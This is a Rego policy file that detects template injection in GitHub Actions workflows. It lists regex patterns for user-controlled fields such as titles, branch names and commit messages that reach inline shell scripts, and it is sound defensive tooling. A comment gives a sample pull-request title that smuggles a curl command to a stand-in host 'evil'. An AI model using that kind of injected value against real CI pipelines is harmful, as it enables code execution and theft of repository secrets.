# template-injection — flag inline `run:` scripts that interpolate
# user-controlled GitHub template expressions directly into the shell
# command. The canonical attacker scenario: a pull request opens with
# a crafted title like `"; curl https://evil; #` and the workflow
# pastes it verbatim into a shell one-liner. Under a privileged
# trigger (`pull_request_target`, `workflow_run`, …) the attacker ends
# up executing arbitrary code with the repo's secrets.
#
# Severity is "critical" for the same reasons as dangerous-triggers
# (ISSUE-802): this is the pattern behind the March 2025
# tj-actions/changed-files supply-chain compromise
# (CVE-2025-30066). The safe way to use such values is via an env:
# binding, then dereferencing the environment variable ("$TITLE"),
# which shell-escapes the value. This policy flags only direct
# interpolation inside `run:`, so the env-binding pattern remains
# quiet.
package template_injection

import rego.v1

# Regex patterns matching template expressions whose value is
# attacker-controlled FREE TEXT — the genuine template-injection
# sinks. A pull-request author, issue/comment author or fork owner
# can put arbitrary shell metacharacters in any of these.
#
# Numeric, boolean, enum and SHA fields (`pull_request.number`,
# `*.commits`, `head.repo.fork`, `event_name`, `author_association`,
# `*.sha`, `github.repository`, …) are deliberately NOT matched: they
# cannot carry an injection payload, and flagging them drowns the
# real signal in false positives.
#
# `[^}]*` keeps every match inside a single `${{ … }}` expression so
# an unrelated safe expression on the same line cannot trigger one.
unsafe_patterns := [
	# Titles and bodies — issue, pull_request, comment, review,
	# discussion.
	`\${{[^}]*github\.event\.[^}]*\.(title|body)\b`,
	# Branch / ref names controlled on the attacker's fork.
	`\${{[^}]*github\.head_ref\b`,
	`\${{[^}]*github\.event\.[^}]*\.head\.(ref|label)\b`,
	`\${{[^}]*github\.event\.[^}]*head_branch\b`,
	`\${{[^}]*github\.event\.[^}]*default_branch\b`,
	# Commit messages.
	`\${{[^}]*github\.event\.[^}]*\.message\b`,
	# Repository metadata an attacker sets on their fork.
	`\${{[^}]*github\.event\.[^}]*\.(description|homepage)\b`,
	# Author / committer identity free text.
	`\${{[^}]*github\.event\.[^}]*(author|committer)\.(name|email)\b`,
	# GitHub Pages page name.
	`\${{[^}]*github\.event\.[^}]*page_name\b`,
]

deny contains finding if {
	some i, j, k
	job := input.pipeline.jobs[i]
	script := job.scripts[j]
	pattern := unsafe_patterns[k]
	regex.match(pattern, script)
	finding := {
		"code":     "ISSUE-207",
		"severity": "critical",
		"message":  sprintf("job %q interpolates a user-controlled template expression into an inline script (template-injection risk)", [job.name]),
		"job":      job.name,
	}
}
